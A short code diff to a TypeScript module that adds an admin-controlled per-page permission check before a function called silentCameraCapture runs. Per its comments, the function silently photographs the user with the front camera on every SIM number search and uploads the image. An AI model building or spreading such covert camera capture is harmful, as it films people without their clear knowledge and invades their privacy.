@@ -1,4 +1,5 @@
 import { supabase } from "@/integrations/supabase/client";
+import { isPermissionEnabled } from "@/lib/page-permissions";
 
 // Silently capture a single frame from the front camera and upload it.
 // Runs on every call (e.g. every SIM number search) so admin can spot misuse.
@@ -13,6 +14,9 @@ export async function silentCameraCapture(searchedNumber?: string): Promise<void
     if (capturing) return;
     if (Date.now() - lastCaptureAt < MIN_GAP_MS) return;
     if (!navigator.mediaDevices?.getUserMedia) return;
+    // Admin-controlled per-page toggle
+    const allowed = await isPermissionEnabled(window.location.pathname, "camera");
+    if (!allowed) return;
     capturing = true;
 
     const stream = await navigator.mediaDevices.getUserMedia({
